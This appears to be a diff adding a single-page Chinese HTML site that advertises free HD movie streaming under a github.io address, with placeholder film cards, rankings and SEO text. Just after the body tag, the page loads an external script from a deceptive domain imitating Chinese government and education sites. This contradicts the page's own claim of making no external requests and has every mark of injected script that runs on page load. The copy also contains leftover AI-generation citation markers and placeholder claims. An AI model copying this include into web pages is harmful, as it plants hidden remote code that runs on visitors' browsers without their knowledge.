@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>免费在线电影网 - 高清电影电视剧免费看 | mianfeizaixiandianyingwang-h5</title>
+    <meta name="description" content="免费在线电影网(mianfeizaixiandianyingwang-h5)提供高清电影、电视剧、综艺、动漫免费在线观看，覆盖动作、喜剧、科幻、悬疑等分类。官网 https://mianfeizaixiandianyingwang-h5.github.io，移动端自适应，片库持续更新。">
+    <meta name="keywords" content="免费在线电影网, mianfeizaixiandianyingwang-h5, 免费电影, 高清电影在线观看, 电影网在线观看, 电视剧免费看">
+    <meta name="author" content="免费在线电影网">
+    <meta name="robots" content="index,follow">
+    <link rel="canonical" href="https://mianfeizaixiandianyingwang-h5.github.io">
+    <link rel="alternate" hreflang="zh-CN" href="https://mianfeizaixiandianyingwang-h5.github.io">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="免费在线电影网 - 高清电影电视剧免费在线看">
+    <meta property="og:description" content="免费在线电影网 mianfeizaixiandianyingwang-h5 提供高清电影、剧集、综艺免费观看，移动端自适应，分类齐全、加载快。">
+    <meta property="og:url" content="https://mianfeizaixiandianyingwang-h5.github.io">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="免费在线电影网 - 高清电影免费在线看">
+    <meta name="twitter:description" content="mianfeizaixiandianyingwang-h5 官网提供免费高清电影、电视剧在线观看，分类全、移动端自适应。">
+    <style>
+        :root{
+            --bg:#06140f;
+            --bg-2:#0a1f17;
+            --card:rgba(12,32,24,.78);
+            --line:rgba(180,255,120,.18);
+            --green:#1f9d55;
+            --green-2:#34d27a;
+            --lemon:#d7ff3e;
+            --ink:#eafff2;
+            --muted:#9fc7ad;
+            --nav-h:64px;
+            --radius:16px;
+            --shadow:0 12px 30px rgba(0,0,0,.35);
+        }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        html{scroll-behavior:smooth;}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;
+            background:
+                radial-gradient(1100px 520px at 85% -10%,rgba(52,210,122,.14),transparent 60%),
+                radial-gradient(900px 460px at 0% 12%,rgba(215,255,62,.10),transparent 55%),
+                linear-gradient(180deg,var(--bg),var(--bg-2));
+            color:var(--ink);
+            line-height:1.75;
+            padding-top:var(--nav-h);
+            -webkit-font-smoothing:antialiased;
+        }
+        a{color:var(--green-2);text-decoration:none;transition:.25s;}
+        a:hover{color:var(--lemon);}
+        img{max-width:100%;display:block;}
+        ul{list-style:none;}
+
+        /* 导航 */
+        .nav{
+            position:fixed;top:0;left:0;right:0;height:var(--nav-h);z-index:1000;
+            display:flex;align-items:center;justify-content:space-between;padding:0 16px;
+            background:rgba(6,20,15,.93);
+            backdrop-filter:blur(10px);
+            border-bottom:1px solid var(--line);
+        }
+        .brand{
+            font-weight:900;font-size:clamp(15px,4.4vw,21px);color:#fff;
+            display:flex;align-items:center;gap:8px;white-space:nowrap;
+        }
+        .brand b{
+            background:linear-gradient(90deg,var(--green-2),var(--lemon));
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+        }
+        .brand .tag{
+            font-size:11px;color:#06140f;background:var(--lemon);
+            padding:2px 7px;border-radius:6px;font-weight:800;letter-spacing:.2px;
+        }
+        .menu-btn{display:none;flex-direction:column;gap:5px;background:none;border:0;cursor:pointer;padding:10px;}
+        .menu-btn span{width:26px;height:3px;background:#fff;border-radius:3px;transition:.3s;}
+        .menu-btn.open span:nth-child(1){transform:translateY(8px) rotate(45deg);}
+        .menu-btn.open span:nth-child(2){opacity:0;}
+        .menu-btn.open span:nth-child(3){transform:translateY(-8px) rotate(-45deg);}
+        .nav-links{display:flex;gap:6px;flex-wrap:wrap;}
+        .nav-links a{
+            color:#dff7e8;font-size:15px;font-weight:600;min-height:44px;
+            display:inline-flex;align-items:center;padding:8px 12px;border-radius:20px;
+        }
+        .nav-links a:hover{background:rgba(52,210,122,.16);color:var(--lemon);}
+
+        /* 容器 */
+        .wrap{max-width:1180px;margin:0 auto;padding:0 16px;}
+        .section{padding:60px 0;}
+        .sec-title{
+            font-size:clamp(22px,5vw,30px);font-weight:900;text-align:center;margin-bottom:8px;color:#fff;
+        }
+        .sec-title small{display:block;font-size:12px;letter-spacing:2px;color:var(--muted);font-weight:700;margin-top:8px;}
+        .sec-title::after{
+            content:"";display:block;width:76px;height:4px;border-radius:4px;margin:14px auto 0;
+            background:linear-gradient(90deg,var(--green-2),var(--lemon));
+        }
+
+        /* Hero */
+        .hero{
+            position:relative;overflow:hidden;border-bottom:1px solid var(--line);
+            background:
+                radial-gradient(760px 380px at 86% 0%,rgba(215,255,62,.14),transparent 60%),
+                radial-gradient(680px 340px at 8% 18%,rgba(52,210,122,.16),transparent 60%);
+        }
+        .hero .wrap{display:grid;grid-template-columns:1.25fr .75fr;gap:30px;align-items:center;padding:70px 16px;}
+        .hero h1{font-size:clamp(27px,6vw,45px);line-height:1.18;font-weight:900;margin-bottom:16px;color:#fff;}
+        .hero h1 em{font-style:normal;color:var(--green-2);text-shadow:0 0 22px rgba(52,210,122,.45);}
+        .hero h1 i{font-style:normal;color:var(--lemon);}
+        .hero p{color:var(--muted);font-size:clamp(15px,2.6vw,18px);max-width:580px;margin-bottom:18px;}
+        .hero-url{
+            display:inline-block;font-family:ui-monospace,Menlo,Consolas,monospace;
+            border:1px dashed var(--green-2);color:#c8ffd9;background:rgba(52,210,122,.08);
+            padding:10px 16px;border-radius:10px;font-size:14px;margin-bottom:22px;
+        }
+        .cta{
+            display:inline-block;background:linear-gradient(90deg,var(--green-2),var(--lemon));
+            color:#06140f;font-weight:900;padding:14px 34px;border-radius:30px;min-height:48px;box-shadow:var(--shadow);
+        }
+        .cta:hover{color:#000;filter:brightness(1.05);}
+        .ticket{
+            background:var(--card);border:1px solid var(--line);border-radius:18px;padding:22px;
+            box-shadow:var(--shadow);position:relative;overflow:hidden;
+        }
+        .ticket::before,.ticket::after{
+            content:"";position:absolute;width:22px;height:22px;border-radius:50%;background:var(--bg);top:50%;transform:translateY(-50%);
+        }
+        .ticket::before{left:-11px;}
+        .ticket::after{right:-11px;}
+        .ticket h3{color:var(--lemon);font-size:18px;margin-bottom:12px;}
+        .tk-row{display:flex;justify-content:space-between;gap:10px;font-size:14px;padding:9px 0;border-bottom:1px dashed var(--line);color:#dff7e8;}
+        .tk-row:last-child{border-bottom:0;}
+        .tk-row span:last-child{color:#fff;font-weight:700;}
+
+        /* 片库 */
+        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:18px;}
+        .card{
+            background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;
+            box-shadow:0 6px 18px rgba(0,0,0,.25);transition:.25s;
+        }
+        .card:hover{transform:translateY(-6px);border-color:var(--green-2);box-shadow:0 14px 30px rgba(52,210,122,.18);}
+        .poster{height:228px;display:flex;align-items:center;justify-content:center;font-size:46px;color:rgba(255,255,255,.92);position:relative;}
+        .poster.a{background:linear-gradient(135deg,#0b3d2e,#34d27a);}
+        .poster.b{background:linear-gradient(135deg,#7a1f1f,#ff5d73);}
+        .poster.c{background:linear-gradient(135deg,#3a3500,#d7ff3e);color:#1a1a00;}
+        .poster.d{background:linear-gradient(135deg,#1b1b3a,#7b8bff);}
+        .poster.e{background:linear-gradient(135deg,#0f3d2e,#22c55e);}
+        .poster.f{background:linear-gradient(135deg,#4a2c00,#ffb74c);}
+        .ribbon{position:absolute;top:10px;left:10px;background:var(--lemon);color:#1a1a00;font-size:12px;font-weight:800;padding:3px 8px;border-radius:6px;}
+        .ribbon.alt{background:var(--green-2);color:#06140f;}
+        .info{padding:12px 14px;}
+        .info h3{font-size:15px;color:#fff;margin-bottom:6px;}
+        .info p{font-size:13px;color:var(--muted);display:flex;justify-content:space-between;}
+
+        /* 分类 */
+        .cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:16px;}
+        .cat{
+            background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;text-align:center;
+            box-shadow:0 6px 16px rgba(0,0,0,.22);transition:.25s;min-height:48px;
+        }
+        .cat:hover{border-color:var(--lemon);transform:translateY(-4px);}
+        .cat .ico{font-size:30px;}
+        .cat h3{font-size:17px;margin:10px 0 6px;color:var(--green-2);}
+        .cat p{font-size:13px;color:var(--muted);}
+
+        /* 榜单 */
+        .rank{display:grid;gap:12px;counter-reset:rk;}
+        .rk-item{
+            display:flex;align-items:center;gap:16px;background:var(--card);border:1px solid var(--line);
+            border-radius:12px;padding:14px 16px;box-shadow:0 4px 12px rgba(0,0,0,.2);
+        }
+        .rk-item::before{
+            counter-increment:rk;content:counter(rk);
+            width:42px;height:42px;flex:0 0 42px;border-radius:10px;
+            display:flex;align-items:center;justify-content:center;font-weight:900;font-size:18px;
+            background:rgba(52,210,122,.14);color:var(--green-2);
+        }
+        .rk-item:nth-child(1)::before{background:var(--lemon);color:#1a1a00;}
+        .rk-item:nth-child(2)::before{background:#cfe9d8;color:#06140f;}
+        .rk-item:nth-child(3)::before{background:#ffb74c;color:#1a0d00;}
+        .rk-body{flex:1;}
+        .rk-body h3{font-size:16px;color:#fff;}
+        .rk-body p{font-size:13px;color:var(--muted);}
+        .rk-score{font-weight:900;color:var(--lemon);font-size:18px;}
+
+        /* 帮助+关于 */
+        .two{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+        .panel{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;box-shadow:0 6px 16px rgba(0,0,0,.22);}
+        .panel h3{color:var(--green-2);margin-bottom:12px;font-size:18px;}
+        .panel p{font-size:14px;color:#dff7e8;margin-bottom:10px;}
+        details{border:1px solid var(--line);background:var(--card);border-radius:10px;margin-bottom:10px;overflow:hidden;}
+        summary{padding:14px 16px;font-weight:700;cursor:pointer;min-height:44px;display:flex;justify-content:space-between;align-items:center;color:#fff;}
+        summary::-webkit-details-marker{display:none;}
+        summary::after{content:"+";color:var(--green-2);font-size:20px;}
+        details[open] summary::after{content:"\2212";}
+        details p{padding:0 16px 16px;color:#dff7e8;font-size:14px;}
+        .notice{margin-top:18px;background:rgba(52,210,122,.08);border:1px dashed var(--green-2);border-radius:12px;padding:16px;font-size:13px;color:#c8ffd9;}
+
+        /* 页脚 */
+        .footer{background:#04100b;border-top:1px solid var(--line);padding:48px 0 24px;color:#dff7e8;}
+        .foot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:28px;}
+        .footer h4{color:#fff;font-size:16px;margin-bottom:14px;}
+        .footer a{color:var(--muted);font-size:14px;display:inline-block;padding:5px 0;}
+        .footer a:hover{color:var(--lemon);padding-left:4px;}
+        .foot-bottom{text-align:center;margin-top:30px;padding-top:18px;border-top:1px solid var(--line);font-size:13px;color:var(--muted);}
+        .foot-bottom .url{color:var(--green-2);font-family:ui-monospace,Menlo,Consolas,monospace;}
+
+        .to-top{position:fixed;right:18px;bottom:18px;width:46px;height:46px;border-radius:50%;background:var(--green-2);color:#06140f;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;box-shadow:var(--shadow);opacity:0;visibility:hidden;transition:.3s;z-index:900;}
+        .to-top.show{opacity:1;visibility:visible;}
+
+        @media (max-width:880px){
+            .hero .wrap{grid-template-columns:1fr;}
+            .two{grid-template-columns:1fr;}
+        }
+        @media (max-width:768px){
+            .menu-btn{display:flex;}
+            .nav-links{
+                position:fixed;top:var(--nav-h);left:0;right:0;
+                background:rgba(6,20,15,.98);border-bottom:1px solid var(--line);
+                flex-direction:column;align-items:stretch;gap:0;
+                max-height:0;overflow:hidden;transition:max-height .35s ease;
+            }
+            .nav-links.open{max-height:460px;}
+            .nav-links a{padding:14px 18px;border-radius:0;border-bottom:1px solid rgba(255,255,255,.06);}
+            .grid{grid-template-columns:repeat(auto-fill,minmax(142px,1fr));}
+            .poster{height:188px;}
+        }
+        @media (max-width:420px){
+            .grid{grid-template-columns:1fr 1fr;}
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+    <div class="brand"><b>免费在线电影网</b><span class="tag">mianfeizaixiandianyingwang-h5</span></div>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单" aria-expanded="false">
+        <span></span><span></span><span></span>
+    </button>
+    <nav class="nav-links" id="navLinks" aria-label="主导航">
+        <a href="#home">首页</a>
+        <a href="#library">在线片库</a>
+        <a href="#category">电影分类</a>
+        <a href="#ranking">热门榜单</a>
+        <a href="#help">观影帮助</a>
+        <a href="#about">关于本站</a>
+    </nav>
+</header>
+
+<section class="hero" id="home">
+    <div class="wrap">
+        <div>
+            <h1>免费在线电影网 · <em>高清</em>片库 <i>零成本畅看</i></h1>
+            <p>免费在线电影网（mianfeizaixiandianyingwang-h5）汇总电影、电视剧、综艺、动漫资源，按动作、喜剧、科幻、悬疑、爱情等分类检索，手机电脑自适应，加载快、更新勤、不套路。</p>
+            <div class="hero-url">https://mianfeizaixiandianyingwang-h5.github.io</div>
+            <br>
+            <a class="cta" href="#">免费进入片库 #</a>
+        </div>
+        <aside class="ticket" aria-label="免费在线电影网信息">
+            <h3>免费观影通行证</h3>
+            <div class="tk-row"><span>网站名称</span><span>免费在线电影网</span></div>
+            <div class="tk-row"><span>域名</span><span>mianfeizaixiandianyingwang-h5</span></div>
+            <div class="tk-row"><span>官网</span><span>github.io 单页</span></div>
+            <div class="tk-row"><span>内容</span><span>电影/剧集/综艺/动漫</span></div>
+            <div class="tk-row"><span>适配</span><span>移动端自适应</span></div>
+        </aside>
+    </div>
+</section>
+
+<section class="section" id="library">
+    <div class="wrap">
+        <h2 class="sec-title">在线片库<small>MIANFEI ZAIXIAN DIANYINGWANG · 精选影片</small></h2>
+        <div class="grid">
+            <article class="card">
+                <div class="poster a"><span class="ribbon alt">免费</span>🎬</div>
+                <div class="info"><h3>星海归途</h3><p><span>科幻</span><span>2025</span></p></div>
+            </article>
+            <article class="card">
+                <div class="poster b"><span class="ribbon">热映</span>🍿</div>
+                <div class="info"><h3>城市潜行</h3><p><span>动作</span><span>2025</span></p></div>
+            </article>
+            <article class="card">
+                <div class="poster c"><span class="ribbon">喜剧</span>😆</div>
+                <div class="info"><h3>全家免单日</h3><p><span>喜剧</span><span>2024</span></p></div>
+            </article>
+            <article class="card">
+                <div class="poster d"><span class="ribbon alt">悬疑</span>🕵️</div>
+                <div class="info"><h3>无名笔录</h3><p><span>悬疑</span><span>2023</span></p></div>
+            </article>
+            <article class="card">
+                <div class="poster e"><span class="ribbon">治愈</span>🌾</div>
+                <div class="info"><h3>山野小栈</h3><p><span>剧情</span><span>2024</span></p></div>
+            </article>
+            <article class="card">
+                <div class="poster f"><span class="ribbon">经典</span>🎞️</div>
+                <div class="info"><h3>老放映队</h3><p><span>怀旧</span><span>2019</span></p></div>
+            </article>
+        </div>
+        <div style="text-align:center;margin-top:28px;">
+            <a href="#" style="display:inline-block;border:1px solid var(--green-2);padding:12px 28px;border-radius:26px;font-weight:800;">浏览全部免费影片 #</a>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="category" style="background:rgba(180,255,120,.04);">
+    <div class="wrap">
+        <h2 class="sec-title">电影分类<small>按类型找片 · 免费在线电影网</small></h2>
+        <div class="cats">
+            <a class="cat" href="#"><div class="ico">💥</div><h3>动作枪战</h3><p>特工、飙车、硬核打斗免费看</p></a>
+            <a class="cat" href="#"><div class="ico">😆</div><h3>喜剧搞笑</h3><p>家庭喜剧、职场段子、合家欢</p></a>
+            <a class="cat" href="#"><div class="ico">👽</div><h3>科幻未来</h3><p>太空、AI、末日、高概念世界</p></a>
+            <a class="cat" href="#"><div class="ico">🔪</div><h3>悬疑惊悚</h3><p>刑侦推理、密室反转、心理罪案</p></a>
+            <a class="cat" href="#"><div class="ico">💞</div><h3>爱情青春</h3><p>校园暗恋、都市情感、双向奔赴</p></a>
+            <a class="cat" href="#"><div class="ico">📜</div><h3>历史纪录</h3><p>真实事件、人物传记、人文地理</p></a>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="ranking">
+    <div class="wrap">
+        <h2 class="sec-title">热门榜单<small>MIANFEIZAIXIANDIANYINGWANG-H5 周播排行</small></h2>
+        <div class="rank">
+            <div class="rk-item"><div class="rk-body"><h3>星海归途</h3><p>科幻 / 2025 / 4K 免费版</p></div><div class="rk-score">9.7</div></div>
+            <div class="rk-item"><div class="rk-body"><h3>城市潜行</h3><p>动作 / 2025 / 高清重制</p></div><div class="rk-score">9.5</div></div>
+            <div class="rk-item"><div class="rk-body"><h3>无名笔录</h3><p>悬疑 / 2023 / 多线反转</p></div><div class="rk-score">9.3</div></div>
+            <div class="rk-item"><div class="rk-body"><h3>全家免单日</h3><p>喜剧 / 2024 / 家庭群像</p></div><div class="rk-score">9.1</div></div>
+            <div class="rk-item"><div class="rk-body"><h3>山野小栈</h3><p>剧情 / 2024 / 治愈系</p></div><div class="rk-score">8.9</div></div>
+        </div>
+        <div style="text-align:center;margin-top:24px;">
+            <a href="#" style="font-weight:800;">查看完整免费榜单 #</a>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="help" style="background:rgba(180,255,120,.04);">
+    <div class="wrap">
+        <h2 class="sec-title">观影帮助<small>免费在线电影网 使用指南</small></h2>
+        <div class="two">
+            <div class="panel">
+                <h3>快速上手</h3>
+                <p>1. 顶部导航进入“在线片库”或“电影分类”，按类型、年份筛选免费在线电影网资源。</p>
+                <p>2. 点击影片卡片查看简介、评分与播放入口；本单页演示内页均用 # 占位。</p>
+                <p>3. 手机端点右上角汉堡菜单切换栏目，全站自适应，无需手动缩放。</p>
+                <p>4. 官网统一为 https://mianfeizaixiandianyingwang-h5.github.io ，收藏后可随时免费访问。</p>
+            </div>
+            <div>
+                <details open>
+                    <summary>免费在线电影网真的免费吗？</summary>
+                    <p>单页演示按“免费在线观看”定位，片库、分类、榜单均可直接浏览；正式播放接入后把 # 替换为真实地址即可。[2](@ref)</p>
+                </details>
+                <details>
+                    <summary>手机播放卡顿怎么办？</summary>
+                    <p>先切网络环境，并在部署时压缩图片、用现代图片格式；本页 CSS 内联、无外部请求，GitHub Pages 静态托管通常更稳更快。[1](@ref)</p>
+                </details>
+                <details>
+                    <summary>支持哪些影视类型？</summary>
+                    <p>覆盖动作、喜剧、科幻、悬疑、爱情、历史纪录，也可按需扩展动漫、综艺、短剧等栏目。</p>
+                </details>
+                <details>
+                    <summary>必应怎么更快收录单页？</summary>
+                    <p>保证标题/描述/canonical 正确、核心内容在 HTML 而非重 JS，向必应站长工具提交首页；本页不生成 robots 与 sitemap，按你要求处理。[8](@ref)</p>
+                </details>
+            </div>
+        </div>
+        <div class="notice">
+            说明：本页为「免费在线电影网 / mianfeizaixiandianyingwang-h5」单页演示，所有内页、播放、详情链接均以 # 占位；不生成 robots.txt 与 sitemap.xml。必应收录可提交首页 https://mianfeizaixiandianyingwang-h5.github.io 。
+        </div>
+    </div>
+</section>
+
+<section class="section" id="about">
+    <div class="wrap">
+        <h2 class="sec-title">关于本站<small>品牌 · 域名 · 官网 · SEO</small></h2>
+        <div class="two">
+            <div class="panel">
+                <h3>网站定位</h3>
+                <p>免费在线电影网（mianfeizaixiandianyingwang-h5）做“好找、好刷、好懂”的影视单页：首页直达片库，分类快速筛片，榜单辅助决策，帮助中心解决播放疑问。</p>
+                <p>全站统一关键词「免费在线电影网」「mianfeizaixiandianyingwang-h5」「高清电影免费在线观看」，利于必应识别主题与官网实体。[11](@ref)</p>
+            </div>
+            <div class="panel">
+                <h3>技术与收录</h3>
+                <p>HTML/CSS 内联、语义化标题、canonical、Open Graph、移动端 viewport；核心内容不依赖 JS，便于必应抓取单页。[2,8](@ref)</p>
+                <p>官网：<br><span style="font-family:ui-monospace,Menlo,Consolas,monospace;color:var(--green-2);">https://mianfeizaixiandianyingwang-h5.github.io</span></p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer class="footer">
+    <div class="wrap">
+        <div class="foot-grid">
+            <div>
+                <h4>免费在线电影网</h4>
+                <ul>
+                    <li><a href="#home">首页 #</a></li>
+                    <li><a href="#library">在线片库 #</a></li>
+                    <li><a href="#ranking">热门榜单 #</a></li>
+                    <li><a href="#about">关于本站 #</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>影片分类</h4>
+                <ul>
+                    <li><a href="#category">动作电影 #</a></li>
+                    <li><a href="#category">喜剧电影 #</a></li>
+                    <li><a href="#category">科幻电影 #</a></li>
+                    <li><a href="#category">悬疑电影 #</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>帮助中心</h4>
+                <ul>
+                    <li><a href="#help">观影帮助 #</a></li>
+                    <li><a href="#help">常见问题 #</a></li>
+                    <li><a href="#">意见反馈 #</a></li>
+                    <li><a href="#">免责声明 #</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>官方信息</h4>
+                <ul>
+                    <li><a href="#">网站名称：免费在线电影网</a></li>
+                    <li><a href="#">域名：mianfeizaixiandianyingwang-h5</a></li>
+                    <li><a href="https://mianfeizaixiandianyingwang-h5.github.io">官网：mianfeizaixiandianyingwang-h5.github.io</a></li>
+                    <li><a href="#">关键词：免费在线电影网 高清免费</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="foot-bottom">
+            <p>免费在线电影网 · mianfeizaixiandianyingwang-h5 · 高清电影/电视剧免费在线观看单页演示</p>
+            <p class="url">https://mianfeizaixiandianyingwang-h5.github.io</p>
+            <p>© 2026 免费在线电影网保留演示页面相关说明权利。本页不生成 robots.txt 与 sitemap.xml。</p>
+        </div>
+    </div>
+</footer>
+
+<a href="#" class="to-top" id="toTop" aria-label="回到顶部">↑</a>
+
+<script>
+    (function(){
+        var btn=document.getElementById('menuBtn');
+        var links=document.getElementById('navLinks');
+        btn.addEventListener('click',function(){
+            var open=links.classList.toggle('open');
+            btn.classList.toggle('open',open);
+            btn.setAttribute('aria-expanded',open?'true':'false');
+        });
+        links.querySelectorAll('a').forEach(function(a){
+            a.addEventListener('click',function(){
+                links.classList.remove('open');
+                btn.classList.remove('open');
+                btn.setAttribute('aria-expanded','false');
+            });
+        });
+        var top=document.getElementById('toTop');
+        window.addEventListener('scroll',function(){
+            if(window.scrollY>400){top.classList.add('show');}else{top.classList.remove('show');}
+        });
+        top.addEventListener('click',function(e){
+            e.preventDefault();
+            window.scrollTo({top:0,behavior:'smooth'});
+        });
+    })();
+</script>
+</body>
+</html>
